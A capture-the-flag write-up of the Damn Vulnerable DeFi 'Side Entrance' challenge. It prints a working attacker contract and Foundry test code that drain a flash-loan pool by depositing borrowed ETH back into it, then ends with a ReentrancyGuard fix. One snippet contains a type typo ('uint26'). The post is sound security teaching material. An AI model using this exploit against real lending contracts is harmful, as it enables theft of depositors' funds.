# The Side Entrance Attack — Abusing Ledger Logic

**Author:** ShiningSugar
**Date:** 2025-11-03
**Tags:** Smart Contract Security, DeFi, Re-entrancy, Flash Loans

-----

## 1. Background: The Two-Door Treasury

This is the post-mortem for the fourth DVDF challenge, **"Side Entrance"**.

This scenario features a lending pool (`SideEntranceLenderPool.sol`) pre-filled with 1,000 ETH. The contract provides two main services:

1.  **Deposits:** Users can `deposit()` ETH, which is tracked in an internal `balances` mapping.
2.  **Flash Loans:** Users can `flashLoan()` the entire pool's balance.

The goal, once again, is to steal all 1,000 ETH from the pool. The vulnerability's name, "Side Entrance," perfectly describes the attack: we use the flash loan (the main entrance) to sneak in and make a deposit (the side entrance), tricking the pool's internal ledger.

## 2. Code Analysis: Ledger vs. Reality

The fatal flaw lies in the pool's schizophrenic accounting. It uses two completely different methods to track its ETH.

**Accounting System 1: The Reality Check (for Flash Loans)**

```
function flashLoan(uint26 amount) external {
    uint256 balanceBefore = address(this).balance;
    // ...
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    
    // This check uses the REAL-TIME ETH balance
    if (address(this).balance < balanceBefore) {
        revert FlashLoanHasNotBeenPaidBack();
    }
}
```

The `flashLoan` function checks for repayment by comparing the contract's *actual ETH balance* (`address(this).balance`) before and after the loan.

**Accounting System 2: The Internal Ledger (for Deposits)**

```
mapping(address => uint256) private balances;

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```

The `deposit` and `withdraw` functions completely ignore the "reality" check. They *only* use the internal `balances` mapping.

**The Flaw:** What if we use the flash loan to call `deposit()`?

  - The `flashLoan`'s "reality" check will pass, because the ETH left the pool and came right back in. `address(this).balance` will be unchanged.
  - But the `deposit` function's "internal ledger" will *also* run, crediting our attack contract with a 1,000 ETH deposit that we never *really* made.

## 3. The Attack (PoC): The Flash-Deposit

To exploit this, we need an attack contract (`attackContract`) because the `flashLoan` function requires `msg.sender` to have an `execute()` function.

Our `attackContract` is designed to perform this "flash-deposit" and then withdraw the funds.

**Attack Contract Logic:**

```
contract attackContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address payable attacker; // The EOA to send funds to

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(msg.sender);
    }

    // Phase 1: Called by the pool during the flash loan
    function execute() external payable override {
        // This is the "Side Entrance"
        // We deposit the 1000 ETH we just borrowed
        pool.deposit{value: msg.value}();
    }

    // Phase 2: Called by the attacker EOA to trigger withdrawal
    fallback() external payable {
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    // A blank receive() is crucial to safely receive
    // the ETH from pool.withdraw() without re-entering the fallback
    receive() external payable {
    }
}
```

**Exploit Orchestration (in testExploit):**

The attack is orchestrated in two transactions from our `testExploit` function.

**Transaction 1: The Flash-Deposit**

```
// Deploy the attack contract
vm.prank(attacker);
attackContract attack = new attackContract(address(sideEntranceLenderPool));

// Prank as the *attack contract* to call the flash loan
vm.prank(address(attack));
sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
```

After this transaction, the pool's 1,000 ETH is still safe. However, its internal ledger now reads: `balances[address(attackContract)] = 1_000e18`.

**Transaction 2: The Withdrawal**

```
// Prank as the *attacker EOA*
vm.prank(attacker);
// Send a low-level call with a junk signature to trigger the fallback
(bool success, ) = address(attack).call(abi.encodeWithSignature("A()"));
require(success, "Fallback call failed");
```

This call triggers our `fallback()` function. The `fallback` calls `pool.withdraw()`, which successfully pulls the 1,000 ETH. The `receive()` function handles the transfer, and the `fallback` then sends the ETH to our `attacker` EOA.

## 4. Defense & Fix

The simplest and most robust defense is to **prevent re-entrancy**.

The `deposit()` and `withdraw()` functions should *never* be callable while a `flashLoan()` is in progress. Adding a standard `nonReentrant` modifier (e.g., from OpenZeppelin) to all three functions (`deposit`, `withdraw`, `flashLoan`) would have completely neutralized this attack.

```
import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";

contract SideEntranceLenderPool is ReentrancyGuard {
    // ...
    function deposit() external payable nonReentrant { ... }
    function withdraw() external nonReentrant { ... }
    function flashLoan(uint256 amount) external nonReentrant { ... }
}
```

This fix ensures that the "main entrance" and "side entrance" can't be used at the same time.

## 5. Conclusion: Key Lessons

 **Flash Loan Callbacks = Re-entrancy:** A flash loan callback `execute()` is a powerful, built-in re-entrancy vector. Any state-changing function in your contract (`deposit`, `withdraw`, etc.) must be protected from being called during a flash loan.
 